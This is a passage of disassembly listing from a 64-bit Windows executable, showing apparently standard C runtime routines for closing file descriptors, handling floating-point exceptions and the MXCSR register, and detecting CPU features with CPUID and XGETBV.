   14000bdfb:	f6 44 d0 38 01       	testb  $0x1,0x38(%rax,%rdx,8)
   14000be00:	74 09                	je     0x14000be0b
   14000be02:	e8 cd 00 00 00       	call   0x14000bed4
   14000be07:	8b d8                	mov    %eax,%ebx
   14000be09:	eb 0e                	jmp    0x14000be19
   14000be0b:	e8 80 9b ff ff       	call   0x140005990
   14000be10:	c7 00 09 00 00 00    	movl   $0x9,(%rax)
   14000be16:	83 cb ff             	or     $0xffffffff,%ebx
   14000be19:	8b 0f                	mov    (%rdi),%ecx
   14000be1b:	e8 b0 be ff ff       	call   0x140007cd0
   14000be20:	8b c3                	mov    %ebx,%eax
   14000be22:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000be27:	48 83 c4 20          	add    $0x20,%rsp
   14000be2b:	5f                   	pop    %rdi
   14000be2c:	c3                   	ret
   14000be2d:	cc                   	int3
   14000be2e:	cc                   	int3
   14000be2f:	cc                   	int3
   14000be30:	89 4c 24 08          	mov    %ecx,0x8(%rsp)
   14000be34:	48 83 ec 38          	sub    $0x38,%rsp
   14000be38:	48 63 d1             	movslq %ecx,%rdx
   14000be3b:	83 fa fe             	cmp    $0xfffffffe,%edx
   14000be3e:	75 15                	jne    0x14000be55
   14000be40:	e8 2b 9b ff ff       	call   0x140005970
   14000be45:	83 20 00             	andl   $0x0,(%rax)
   14000be48:	e8 43 9b ff ff       	call   0x140005990
   14000be4d:	c7 00 09 00 00 00    	movl   $0x9,(%rax)
   14000be53:	eb 74                	jmp    0x14000bec9
   14000be55:	85 c9                	test   %ecx,%ecx
   14000be57:	78 58                	js     0x14000beb1
   14000be59:	3b 15 71 cd 00 00    	cmp    0xcd71(%rip),%edx        # 0x140018bd0
   14000be5f:	73 50                	jae    0x14000beb1
   14000be61:	48 8b ca             	mov    %rdx,%rcx
   14000be64:	4c 8d 05 65 c9 00 00 	lea    0xc965(%rip),%r8        # 0x1400187d0
   14000be6b:	83 e1 3f             	and    $0x3f,%ecx
   14000be6e:	48 8b c2             	mov    %rdx,%rax
   14000be71:	48 c1 f8 06          	sar    $0x6,%rax
   14000be75:	48 8d 0c c9          	lea    (%rcx,%rcx,8),%rcx
   14000be79:	49 8b 04 c0          	mov    (%r8,%rax,8),%rax
   14000be7d:	f6 44 c8 38 01       	testb  $0x1,0x38(%rax,%rcx,8)
   14000be82:	74 2d                	je     0x14000beb1
   14000be84:	48 8d 44 24 40       	lea    0x40(%rsp),%rax
   14000be89:	89 54 24 50          	mov    %edx,0x50(%rsp)
   14000be8d:	89 54 24 58          	mov    %edx,0x58(%rsp)
   14000be91:	4c 8d 4c 24 50       	lea    0x50(%rsp),%r9
   14000be96:	48 8d 54 24 58       	lea    0x58(%rsp),%rdx
   14000be9b:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   14000bea0:	4c 8d 44 24 20       	lea    0x20(%rsp),%r8
   14000bea5:	48 8d 4c 24 48       	lea    0x48(%rsp),%rcx
   14000beaa:	e8 0d ff ff ff       	call   0x14000bdbc
   14000beaf:	eb 1b                	jmp    0x14000becc
   14000beb1:	e8 ba 9a ff ff       	call   0x140005970
   14000beb6:	83 20 00             	andl   $0x0,(%rax)
   14000beb9:	e8 d2 9a ff ff       	call   0x140005990
   14000bebe:	c7 00 09 00 00 00    	movl   $0x9,(%rax)
   14000bec4:	e8 a7 99 ff ff       	call   0x140005870
   14000bec9:	83 c8 ff             	or     $0xffffffff,%eax
   14000becc:	48 83 c4 38          	add    $0x38,%rsp
   14000bed0:	c3                   	ret
   14000bed1:	cc                   	int3
   14000bed2:	cc                   	int3
   14000bed3:	cc                   	int3
   14000bed4:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000bed9:	57                   	push   %rdi
   14000beda:	48 83 ec 20          	sub    $0x20,%rsp
   14000bede:	48 63 f9             	movslq %ecx,%rdi
   14000bee1:	8b cf                	mov    %edi,%ecx
   14000bee3:	e8 cc be ff ff       	call   0x140007db4
   14000bee8:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
   14000beec:	75 04                	jne    0x14000bef2
   14000beee:	33 db                	xor    %ebx,%ebx
   14000bef0:	eb 5a                	jmp    0x14000bf4c
   14000bef2:	48 8b 05 d7 c8 00 00 	mov    0xc8d7(%rip),%rax        # 0x1400187d0
   14000bef9:	b9 02 00 00 00       	mov    $0x2,%ecx
   14000befe:	83 ff 01             	cmp    $0x1,%edi
   14000bf01:	75 09                	jne    0x14000bf0c
   14000bf03:	40 84 b8 c8 00 00 00 	test   %dil,0xc8(%rax)
   14000bf0a:	75 0d                	jne    0x14000bf19
   14000bf0c:	3b f9                	cmp    %ecx,%edi
   14000bf0e:	75 20                	jne    0x14000bf30
   14000bf10:	f6 80 80 00 00 00 01 	testb  $0x1,0x80(%rax)
   14000bf17:	74 17                	je     0x14000bf30
   14000bf19:	e8 96 be ff ff       	call   0x140007db4
   14000bf1e:	b9 01 00 00 00       	mov    $0x1,%ecx
   14000bf23:	48 8b d8             	mov    %rax,%rbx
   14000bf26:	e8 89 be ff ff       	call   0x140007db4
   14000bf2b:	48 3b c3             	cmp    %rbx,%rax
   14000bf2e:	74 be                	je     0x14000beee
   14000bf30:	8b cf                	mov    %edi,%ecx
   14000bf32:	e8 7d be ff ff       	call   0x140007db4
   14000bf37:	48 8b c8             	mov    %rax,%rcx
   14000bf3a:	ff 15 e8 10 00 00    	call   *0x10e8(%rip)        # 0x14000d028
   14000bf40:	85 c0                	test   %eax,%eax
   14000bf42:	75 aa                	jne    0x14000beee
   14000bf44:	ff 15 ce 10 00 00    	call   *0x10ce(%rip)        # 0x14000d018
   14000bf4a:	8b d8                	mov    %eax,%ebx
   14000bf4c:	8b cf                	mov    %edi,%ecx
   14000bf4e:	e8 a5 bd ff ff       	call   0x140007cf8
   14000bf53:	48 8b d7             	mov    %rdi,%rdx
   14000bf56:	4c 8d 05 73 c8 00 00 	lea    0xc873(%rip),%r8        # 0x1400187d0
   14000bf5d:	83 e2 3f             	and    $0x3f,%edx
   14000bf60:	48 8b cf             	mov    %rdi,%rcx
   14000bf63:	48 c1 f9 06          	sar    $0x6,%rcx
   14000bf67:	48 8d 14 d2          	lea    (%rdx,%rdx,8),%rdx
   14000bf6b:	49 8b 0c c8          	mov    (%r8,%rcx,8),%rcx
   14000bf6f:	c6 44 d1 38 00       	movb   $0x0,0x38(%rcx,%rdx,8)
   14000bf74:	85 db                	test   %ebx,%ebx
   14000bf76:	74 0c                	je     0x14000bf84
   14000bf78:	8b cb                	mov    %ebx,%ecx
   14000bf7a:	e8 a1 99 ff ff       	call   0x140005920
   14000bf7f:	83 c8 ff             	or     $0xffffffff,%eax
   14000bf82:	eb 02                	jmp    0x14000bf86
   14000bf84:	33 c0                	xor    %eax,%eax
   14000bf86:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000bf8b:	48 83 c4 20          	add    $0x20,%rsp
   14000bf8f:	5f                   	pop    %rdi
   14000bf90:	c3                   	ret
   14000bf91:	cc                   	int3
   14000bf92:	cc                   	int3
   14000bf93:	cc                   	int3
   14000bf94:	83 49 18 ff          	orl    $0xffffffff,0x18(%rcx)
   14000bf98:	33 c0                	xor    %eax,%eax
   14000bf9a:	48 89 01             	mov    %rax,(%rcx)
   14000bf9d:	48 89 41 08          	mov    %rax,0x8(%rcx)
   14000bfa1:	89 41 10             	mov    %eax,0x10(%rcx)
   14000bfa4:	48 89 41 1c          	mov    %rax,0x1c(%rcx)
   14000bfa8:	48 89 41 28          	mov    %rax,0x28(%rcx)
   14000bfac:	87 41 14             	xchg   %eax,0x14(%rcx)
   14000bfaf:	c3                   	ret
   14000bfb0:	48 8b c4             	mov    %rsp,%rax
   14000bfb3:	53                   	push   %rbx
   14000bfb4:	48 83 ec 50          	sub    $0x50,%rsp
   14000bfb8:	f2 0f 10 84 24 80 00 	movsd  0x80(%rsp),%xmm0
   14000bfbf:	00 00 
   14000bfc1:	8b d9                	mov    %ecx,%ebx
   14000bfc3:	f2 0f 10 8c 24 88 00 	movsd  0x88(%rsp),%xmm1
   14000bfca:	00 00 
   14000bfcc:	ba c0 ff 00 00       	mov    $0xffc0,%edx
   14000bfd1:	89 48 c8             	mov    %ecx,-0x38(%rax)
   14000bfd4:	48 8b 8c 24 90 00 00 	mov    0x90(%rsp),%rcx
   14000bfdb:	00 
   14000bfdc:	f2 0f 11 40 e0       	movsd  %xmm0,-0x20(%rax)
   14000bfe1:	f2 0f 11 48 e8       	movsd  %xmm1,-0x18(%rax)
   14000bfe6:	f2 0f 11 58 d8       	movsd  %xmm3,-0x28(%rax)
   14000bfeb:	4c 89 40 d0          	mov    %r8,-0x30(%rax)
   14000bfef:	e8 24 07 00 00       	call   0x14000c718
   14000bff4:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   14000bff9:	e8 5a 7d ff ff       	call   0x140003d58
   14000bffe:	85 c0                	test   %eax,%eax
   14000c000:	75 07                	jne    0x14000c009
   14000c002:	8b cb                	mov    %ebx,%ecx
   14000c004:	e8 bf 06 00 00       	call   0x14000c6c8
   14000c009:	f2 0f 10 44 24 40    	movsd  0x40(%rsp),%xmm0
   14000c00f:	48 83 c4 50          	add    $0x50,%rsp
   14000c013:	5b                   	pop    %rbx
   14000c014:	c3                   	ret
   14000c015:	cc                   	int3
   14000c016:	cc                   	int3
   14000c017:	cc                   	int3
   14000c018:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000c01d:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   14000c022:	57                   	push   %rdi
   14000c023:	48 83 ec 20          	sub    $0x20,%rsp
   14000c027:	8b d9                	mov    %ecx,%ebx
   14000c029:	48 8b f2             	mov    %rdx,%rsi
   14000c02c:	83 e3 1f             	and    $0x1f,%ebx
   14000c02f:	8b f9                	mov    %ecx,%edi
   14000c031:	f6 c1 08             	test   $0x8,%cl
   14000c034:	74 14                	je     0x14000c04a
   14000c036:	40 84 f6             	test   %sil,%sil
   14000c039:	79 0f                	jns    0x14000c04a
   14000c03b:	b9 01 00 00 00       	mov    $0x1,%ecx
   14000c040:	e8 4f 07 00 00       	call   0x14000c794
   14000c045:	83 e3 f7             	and    $0xfffffff7,%ebx
   14000c048:	eb 57                	jmp    0x14000c0a1
   14000c04a:	b9 04 00 00 00       	mov    $0x4,%ecx
   14000c04f:	40 84 f9             	test   %dil,%cl
   14000c052:	74 11                	je     0x14000c065
   14000c054:	48 0f ba e6 09       	bt     $0x9,%rsi
   14000c059:	73 0a                	jae    0x14000c065
   14000c05b:	e8 34 07 00 00       	call   0x14000c794
   14000c060:	83 e3 fb             	and    $0xfffffffb,%ebx
   14000c063:	eb 3c                	jmp    0x14000c0a1
   14000c065:	40 f6 c7 01          	test   $0x1,%dil
   14000c069:	74 16                	je     0x14000c081
   14000c06b:	48 0f ba e6 0a       	bt     $0xa,%rsi
   14000c070:	73 0f                	jae    0x14000c081
   14000c072:	b9 08 00 00 00       	mov    $0x8,%ecx
   14000c077:	e8 18 07 00 00       	call   0x14000c794
   14000c07c:	83 e3 fe             	and    $0xfffffffe,%ebx
   14000c07f:	eb 20                	jmp    0x14000c0a1
   14000c081:	40 f6 c7 02          	test   $0x2,%dil
   14000c085:	74 1a                	je     0x14000c0a1
   14000c087:	48 0f ba e6 0b       	bt     $0xb,%rsi
   14000c08c:	73 13                	jae    0x14000c0a1
   14000c08e:	40 f6 c7 10          	test   $0x10,%dil
   14000c092:	74 0a                	je     0x14000c09e
   14000c094:	b9 10 00 00 00       	mov    $0x10,%ecx
   14000c099:	e8 f6 06 00 00       	call   0x14000c794
   14000c09e:	83 e3 fd             	and    $0xfffffffd,%ebx
   14000c0a1:	40 f6 c7 10          	test   $0x10,%dil
   14000c0a5:	74 14                	je     0x14000c0bb
   14000c0a7:	48 0f ba e6 0c       	bt     $0xc,%rsi
   14000c0ac:	73 0d                	jae    0x14000c0bb
   14000c0ae:	b9 20 00 00 00       	mov    $0x20,%ecx
   14000c0b3:	e8 dc 06 00 00       	call   0x14000c794
   14000c0b8:	83 e3 ef             	and    $0xffffffef,%ebx
   14000c0bb:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   14000c0c0:	33 c0                	xor    %eax,%eax
   14000c0c2:	85 db                	test   %ebx,%ebx
   14000c0c4:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000c0c9:	0f 94 c0             	sete   %al
   14000c0cc:	48 83 c4 20          	add    $0x20,%rsp
   14000c0d0:	5f                   	pop    %rdi
   14000c0d1:	c3                   	ret
   14000c0d2:	cc                   	int3
   14000c0d3:	cc                   	int3
   14000c0d4:	48 8b c4             	mov    %rsp,%rax
   14000c0d7:	55                   	push   %rbp
   14000c0d8:	53                   	push   %rbx
   14000c0d9:	56                   	push   %rsi
   14000c0da:	57                   	push   %rdi
   14000c0db:	41 56                	push   %r14
   14000c0dd:	48 8d 68 c9          	lea    -0x37(%rax),%rbp
   14000c0e1:	48 81 ec f0 00 00 00 	sub    $0xf0,%rsp
   14000c0e8:	0f 29 70 c8          	movaps %xmm6,-0x38(%rax)
   14000c0ec:	48 8b 05 0d af 00 00 	mov    0xaf0d(%rip),%rax        # 0x140017000
   14000c0f3:	48 33 c4             	xor    %rsp,%rax
   14000c0f6:	48 89 45 ef          	mov    %rax,-0x11(%rbp)
   14000c0fa:	8b f2                	mov    %edx,%esi
   14000c0fc:	4c 8b f1             	mov    %rcx,%r14
   14000c0ff:	ba c0 ff 00 00       	mov    $0xffc0,%edx
   14000c104:	b9 80 1f 00 00       	mov    $0x1f80,%ecx
   14000c109:	41 8b f9             	mov    %r9d,%edi
   14000c10c:	49 8b d8             	mov    %r8,%rbx
   14000c10f:	e8 04 06 00 00       	call   0x14000c718
   14000c114:	8b 4d 5f             	mov    0x5f(%rbp),%ecx
   14000c117:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
   14000c11c:	48 89 5c 24 50       	mov    %rbx,0x50(%rsp)
   14000c121:	f2 0f 10 44 24 50    	movsd  0x50(%rsp),%xmm0
   14000c127:	48 8b 54 24 40       	mov    0x40(%rsp),%rdx
   14000c12c:	f2 0f 11 44 24 48    	movsd  %xmm0,0x48(%rsp)
   14000c132:	e8 e1 fe ff ff       	call   0x14000c018
   14000c137:	f2 0f 10 75 77       	movsd  0x77(%rbp),%xmm6
   14000c13c:	85 c0                	test   %eax,%eax
   14000c13e:	75 40                	jne    0x14000c180
   14000c140:	83 7d 7f 02          	cmpl   $0x2,0x7f(%rbp)
   14000c144:	75 11                	jne    0x14000c157
   14000c146:	8b 45 bf             	mov    -0x41(%rbp),%eax
   14000c149:	83 e0 e3             	and    $0xffffffe3,%eax
   14000c14c:	f2 0f 11 75 af       	movsd  %xmm6,-0x51(%rbp)
   14000c151:	83 c8 03             	or     $0x3,%eax
   14000c154:	89 45 bf             	mov    %eax,-0x41(%rbp)
   14000c157:	44 8b 45 5f          	mov    0x5f(%rbp),%r8d
   14000c15b:	48 8d 44 24 48       	lea    0x48(%rsp),%rax
   14000c160:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   14000c165:	48 8d 54 24 40       	lea    0x40(%rsp),%rdx
   14000c16a:	48 8d 45 6f          	lea    0x6f(%rbp),%rax
   14000c16e:	44 8b ce             	mov    %esi,%r9d
   14000c171:	48 8d 4c 24 60       	lea    0x60(%rsp),%rcx
   14000c176:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   14000c17b:	e8 10 02 00 00       	call   0x14000c390
   14000c180:	e8 ab 7b ff ff       	call   0x140003d30
   14000c185:	84 c0                	test   %al,%al
   14000c187:	74 34                	je     0x14000c1bd
   14000c189:	85 ff                	test   %edi,%edi
   14000c18b:	74 30                	je     0x14000c1bd
   14000c18d:	48 8b 44 24 40       	mov    0x40(%rsp),%rax
   14000c192:	4d 8b c6             	mov    %r14,%r8
   14000c195:	f2 0f 10 44 24 48    	movsd  0x48(%rsp),%xmm0
   14000c19b:	8b cf                	mov    %edi,%ecx
   14000c19d:	f2 0f 10 5d 6f       	movsd  0x6f(%rbp),%xmm3
   14000c1a2:	8b 55 67             	mov    0x67(%rbp),%edx
   14000c1a5:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   14000c1aa:	f2 0f 11 44 24 28    	movsd  %xmm0,0x28(%rsp)
   14000c1b0:	f2 0f 11 74 24 20    	movsd  %xmm6,0x20(%rsp)
   14000c1b6:	e8 f5 fd ff ff       	call   0x14000bfb0
   14000c1bb:	eb 1c                	jmp    0x14000c1d9
   14000c1bd:	8b cf                	mov    %edi,%ecx
   14000c1bf:	e8 04 05 00 00       	call   0x14000c6c8
   14000c1c4:	48 8b 4c 24 40       	mov    0x40(%rsp),%rcx
   14000c1c9:	ba c0 ff 00 00       	mov    $0xffc0,%edx
   14000c1ce:	e8 45 05 00 00       	call   0x14000c718
   14000c1d3:	f2 0f 10 44 24 48    	movsd  0x48(%rsp),%xmm0
   14000c1d9:	48 8b 4d ef          	mov    -0x11(%rbp),%rcx
   14000c1dd:	48 33 cc             	xor    %rsp,%rcx
   14000c1e0:	e8 9b 53 ff ff       	call   0x140001580
   14000c1e5:	0f 28 b4 24 e0 00 00 	movaps 0xe0(%rsp),%xmm6
   14000c1ec:	00 
   14000c1ed:	48 81 c4 f0 00 00 00 	add    $0xf0,%rsp
   14000c1f4:	41 5e                	pop    %r14
   14000c1f6:	5f                   	pop    %rdi
   14000c1f7:	5e                   	pop    %rsi
   14000c1f8:	5b                   	pop    %rbx
   14000c1f9:	5d                   	pop    %rbp
   14000c1fa:	c3                   	ret
   14000c1fb:	cc                   	int3
   14000c1fc:	cc                   	int3
   14000c1fd:	cc                   	int3
   14000c1fe:	cc                   	int3
   14000c1ff:	cc                   	int3
   14000c200:	40 53                	rex push %rbx
   14000c202:	48 83 ec 10          	sub    $0x10,%rsp
   14000c206:	45 33 c0             	xor    %r8d,%r8d
   14000c209:	33 c9                	xor    %ecx,%ecx
   14000c20b:	44 89 05 26 ca 00 00 	mov    %r8d,0xca26(%rip)        # 0x140018c38
   14000c212:	45 8d 48 01          	lea    0x1(%r8),%r9d
   14000c216:	41 8b c1             	mov    %r9d,%eax
   14000c219:	0f a2                	cpuid
   14000c21b:	89 04 24             	mov    %eax,(%rsp)
   14000c21e:	b8 00 10 00 18       	mov    $0x18001000,%eax
   14000c223:	89 4c 24 08          	mov    %ecx,0x8(%rsp)
   14000c227:	23 c8                	and    %eax,%ecx
   14000c229:	89 5c 24 04          	mov    %ebx,0x4(%rsp)
   14000c22d:	89 54 24 0c          	mov    %edx,0xc(%rsp)
   14000c231:	3b c8                	cmp    %eax,%ecx
   14000c233:	75 2c                	jne    0x14000c261
   14000c235:	33 c9                	xor    %ecx,%ecx
   14000c237:	0f 01 d0             	xgetbv
   14000c23a:	48 c1 e2 20          	shl    $0x20,%rdx
   14000c23e:	48 0b d0             	or     %rax,%rdx
   14000c241:	48 89 54 24 20       	mov    %rdx,0x20(%rsp)
   14000c246:	48 8b 44 24 20       	mov    0x20(%rsp),%rax
   14000c24b:	44 8b 05 e6 c9 00 00 	mov    0xc9e6(%rip),%r8d        # 0x140018c38
   14000c252:	24 06                	and    $0x6,%al
   14000c254:	3c 06                	cmp    $0x6,%al
   14000c256:	45 0f 44 c1          	cmove  %r9d,%r8d
   14000c25a:	44 89 05 d7 c9 00 00 	mov    %r8d,0xc9d7(%rip)        # 0x140018c38
   14000c261:	44 89 05 d4 c9 00 00 	mov    %r8d,0xc9d4(%rip)        # 0x140018c3c
   14000c268:	33 c0                	xor    %eax,%eax
   14000c26a:	48 83 c4 10          	add    $0x10,%rsp
   14000c26e:	5b                   	pop    %rbx
   14000c26f:	c3                   	ret
   14000c270:	48 83 ec 38          	sub    $0x38,%rsp
   14000c274:	48 8d 05 55 84 00 00 	lea    0x8455(%rip),%rax        # 0x1400146d0
   14000c27b:	41 b9 1b 00 00 00    	mov    $0x1b,%r9d
   14000c281:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   14000c286:	e8 05 00 00 00       	call   0x14000c290
   14000c28b:	48 83 c4 38          	add    $0x38,%rsp
   14000c28f:	c3                   	ret
   14000c290:	48 8b c4             	mov    %rsp,%rax
   14000c293:	48 83 ec 68          	sub    $0x68,%rsp
   14000c297:	0f 29 70 e8          	movaps %xmm6,-0x18(%rax)
   14000c29b:	0f 28 f1             	movaps %xmm1,%xmm6
   14000c29e:	41 8b d1             	mov    %r9d,%edx
   14000c2a1:	0f 28 d8             	movaps %xmm0,%xmm3
   14000c2a4:	41 83 e8 01          	sub    $0x1,%r8d
   14000c2a8:	74 2a                	je     0x14000c2d4
   14000c2aa:	41 83 f8 01          	cmp    $0x1,%r8d
   14000c2ae:	75 69                	jne    0x14000c319
   14000c2b0:	44 89 40 d8          	mov    %r8d,-0x28(%rax)
   14000c2b4:	0f 57 d2             	xorps  %xmm2,%xmm2
   14000c2b7:	f2 0f 11 50 d0       	movsd  %xmm2,-0x30(%rax)
   14000c2bc:	45 8b c8             	mov    %r8d,%r9d
   14000c2bf:	f2 0f 11 40 c8       	movsd  %xmm0,-0x38(%rax)
   14000c2c4:	c7 40 c0 21 00 00 00 	movl   $0x21,-0x40(%rax)
   14000c2cb:	c7 40 b8 08 00 00 00 	movl   $0x8,-0x48(%rax)
   14000c2d2:	eb 2d                	jmp    0x14000c301
   14000c2d4:	c7 44 24 40 01 00 00 	movl   $0x1,0x40(%rsp)
   14000c2db:	00 
   14000c2dc:	0f 57 c0             	xorps  %xmm0,%xmm0
   14000c2df:	f2 0f 11 44 24 38    	movsd  %xmm0,0x38(%rsp)
   14000c2e5:	41 b9 02 00 00 00    	mov    $0x2,%r9d
   14000c2eb:	f2 0f 11 5c 24 30    	movsd  %xmm3,0x30(%rsp)
   14000c2f1:	c7 44 24 28 22 00 00 	movl   $0x22,0x28(%rsp)
   14000c2f8:	00 
   14000c2f9:	c7 44 24 20 04 00 00 	movl   $0x4,0x20(%rsp)
   14000c300:	00 
   14000c301:	48 8b 8c 24 90 00 00 	mov    0x90(%rsp),%rcx
   14000c308:	00 
   14000c309:	f2 0f 11 74 24 78    	movsd  %xmm6,0x78(%rsp)
   14000c30f:	4c 8b 44 24 78       	mov    0x78(%rsp),%r8
   14000c314:	e8 bb fd ff ff       	call   0x14000c0d4
   14000c319:	0f 28 c6             	movaps %xmm6,%xmm0
   14000c31c:	0f 28 74 24 50       	movaps 0x50(%rsp),%xmm6
   14000c321:	48 83 c4 68          	add    $0x68,%rsp
   14000c325:	c3                   	ret
   14000c326:	cc                   	int3
   14000c327:	cc                   	int3
   14000c328:	cc                   	int3
   14000c329:	cc                   	int3
   14000c32a:	cc                   	int3
   14000c32b:	cc                   	int3
   14000c32c:	cc                   	int3
   14000c32d:	cc                   	int3
   14000c32e:	cc                   	int3
   14000c32f:	cc                   	int3
   14000c330:	cc                   	int3
   14000c331:	cc                   	int3
   14000c332:	cc                   	int3
   14000c333:	cc                   	int3
   14000c334:	cc                   	int3
   14000c335:	cc                   	int3
   14000c336:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   14000c33d:	00 00 00 
   14000c340:	48 83 ec 08          	sub    $0x8,%rsp
   14000c344:	0f ae 1c 24          	stmxcsr (%rsp)
   14000c348:	8b 04 24             	mov    (%rsp),%eax
   14000c34b:	48 83 c4 08          	add    $0x8,%rsp
   14000c34f:	c3                   	ret
   14000c350:	89 4c 24 08          	mov    %ecx,0x8(%rsp)
   14000c354:	0f ae 54 24 08       	ldmxcsr 0x8(%rsp)
   14000c359:	c3                   	ret
   14000c35a:	0f ae 5c 24 08       	stmxcsr 0x8(%rsp)
   14000c35f:	b9 c0 ff ff ff       	mov    $0xffffffc0,%ecx
   14000c364:	21 4c 24 08          	and    %ecx,0x8(%rsp)
   14000c368:	0f ae 54 24 08       	ldmxcsr 0x8(%rsp)
   14000c36d:	c3                   	ret
   14000c36e:	66 0f 2e 05 6a 83 00 	ucomisd 0x836a(%rip),%xmm0        # 0x1400146e0
   14000c375:	00 
   14000c376:	73 14                	jae    0x14000c38c
   14000c378:	66 0f 2e 05 68 83 00 	ucomisd 0x8368(%rip),%xmm0        # 0x1400146e8
   14000c37f:	00 
   14000c380:	76 0a                	jbe    0x14000c38c
   14000c382:	f2 48 0f 2d c8       	cvtsd2si %xmm0,%rcx
   14000c387:	f2 48 0f 2a c1       	cvtsi2sd %rcx,%xmm0
   14000c38c:	c3                   	ret
   14000c38d:	cc                   	int3
   14000c38e:	cc                   	int3
   14000c38f:	cc                   	int3
   14000c390:	48 83 ec 48          	sub    $0x48,%rsp
   14000c394:	83 64 24 30 00       	andl   $0x0,0x30(%rsp)
   14000c399:	48 8b 44 24 78       	mov    0x78(%rsp),%rax
   14000c39e:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   14000c3a3:	48 8b 44 24 70       	mov    0x70(%rsp),%rax
   14000c3a8:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   14000c3ad:	e8 06 00 00 00       	call   0x14000c3b8
   14000c3b2:	48 83 c4 48          	add    $0x48,%rsp
   14000c3b6:	c3                   	ret
   14000c3b7:	cc                   	int3
   14000c3b8:	48 8b c4             	mov    %rsp,%rax
   14000c3bb:	48 89 58 10          	mov    %rbx,0x10(%rax)
   14000c3bf:	48 89 70 18          	mov    %rsi,0x18(%rax)
   14000c3c3:	48 89 78 20          	mov    %rdi,0x20(%rax)
   14000c3c7:	48 89 48 08          	mov    %rcx,0x8(%rax)
   14000c3cb:	55                   	push   %rbp
   14000c3cc:	48 8b ec             	mov    %rsp,%rbp
   14000c3cf:	48 83 ec 20          	sub    $0x20,%rsp
   14000c3d3:	48 8b da             	mov    %rdx,%rbx
   14000c3d6:	41 8b f1             	mov    %r9d,%esi
   14000c3d9:	33 d2                	xor    %edx,%edx
   14000c3db:	bf 0d 00 00 c0       	mov    $0xc000000d,%edi
   14000c3e0:	89 51 04             	mov    %edx,0x4(%rcx)
   14000c3e3:	48 8b 45 10          	mov    0x10(%rbp),%rax
   14000c3e7:	89 50 08             	mov    %edx,0x8(%rax)
   14000c3ea:	48 8b 45 10          	mov    0x10(%rbp),%rax
   14000c3ee:	89 50 0c             	mov    %edx,0xc(%rax)
   14000c3f1:	41 f6 c0 10          	test   $0x10,%r8b
   14000c3f5:	74 0d                	je     0x14000c404
   14000c3f7:	48 8b 45 10          	mov    0x10(%rbp),%rax
   14000c3fb:	bf 8f 00 00 c0       	mov    $0xc000008f,%edi
   14000c400:	83 48 04 01          	orl    $0x1,0x4(%rax)
   14000c404:	41 f6 c0 02          	test   $0x2,%r8b
   14000c408:	74 0d                	je     0x14000c417
   14000c40a:	48 8b 45 10          	mov    0x10(%rbp),%rax
   14000c40e:	bf 93 00 00 c0       	mov    $0xc0000093,%edi
   14000c413:	83 48 04 02          	orl    $0x2,0x4(%rax)
   14000c417:	41 f6 c0 01          	test   $0x1,%r8b
   14000c41b:	74 0d                	je     0x14000c42a
   14000c41d:	48 8b 45 10          	mov    0x10(%rbp),%rax
   14000c421:	bf 91 00 00 c0       	mov    $0xc0000091,%edi
   14000c426:	83 48 04 04          	orl    $0x4,0x4(%rax)
   14000c42a:	41 f6 c0 04          	test   $0x4,%r8b
   14000c42e:	74 0d                	je     0x14000c43d
   14000c430:	48 8b 45 10          	mov    0x10(%rbp),%rax
   14000c434:	bf 8e 00 00 c0       	mov    $0xc000008e,%edi
   14000c439:	83 48 04 08          	orl    $0x8,0x4(%rax)
   14000c43d:	41 f6 c0 08          	test   $0x8,%r8b
   14000c441:	74 0d                	je     0x14000c450
   14000c443:	48 8b 45 10          	mov    0x10(%rbp),%rax
   14000c447:	bf 90 00 00 c0       	mov    $0xc0000090,%edi
   14000c44c:	83 48 04 10          	orl    $0x10,0x4(%rax)
   14000c450:	48 8b 4d 10          	mov    0x10(%rbp),%rcx
   14000c454:	48 8b 03             	mov    (%rbx),%rax
   14000c457:	48 c1 e8 07          	shr    $0x7,%rax
   14000c45b:	c1 e0 04             	shl    $0x4,%eax
   14000c45e:	f7 d0                	not    %eax
   14000c460:	33 41 08             	xor    0x8(%rcx),%eax
   14000c463:	83 e0 10             	and    $0x10,%eax
   14000c466:	31 41 08             	xor    %eax,0x8(%rcx)
   14000c469:	48 8b 4d 10          	mov    0x10(%rbp),%rcx
   14000c46d:	48 8b 03             	mov    (%rbx),%rax
   14000c470:	48 c1 e8 09          	shr    $0x9,%rax
   14000c474:	c1 e0 03             	shl    $0x3,%eax
   14000c477:	f7 d0                	not    %eax
   14000c479:	33 41 08             	xor    0x8(%rcx),%eax
   14000c47c:	83 e0 08             	and    $0x8,%eax
   14000c47f:	31 41 08             	xor    %eax,0x8(%rcx)
   14000c482:	48 8b 4d 10          	mov    0x10(%rbp),%rcx
   14000c486:	48 8b 03             	mov    (%rbx),%rax
   14000c489:	48 c1 e8 0a          	shr    $0xa,%rax
   14000c48d:	c1 e0 02             	shl    $0x2,%eax
   14000c490:	f7 d0                	not    %eax
   14000c492:	33 41 08             	xor    0x8(%rcx),%eax
   14000c495:	83 e0 04             	and    $0x4,%eax
   14000c498:	31 41 08             	xor    %eax,0x8(%rcx)
   14000c49b:	48 8b 4d 10          	mov    0x10(%rbp),%rcx
   14000c49f:	48 8b 03             	mov    (%rbx),%rax
   14000c4a2:	48 c1 e8 0b          	shr    $0xb,%rax
   14000c4a6:	03 c0                	add    %eax,%eax
   14000c4a8:	f7 d0                	not    %eax
   14000c4aa:	33 41 08             	xor    0x8(%rcx),%eax
   14000c4ad:	83 e0 02             	and    $0x2,%eax
   14000c4b0:	31 41 08             	xor    %eax,0x8(%rcx)
   14000c4b3:	8b 03                	mov    (%rbx),%eax
   14000c4b5:	48 8b 4d 10          	mov    0x10(%rbp),%rcx
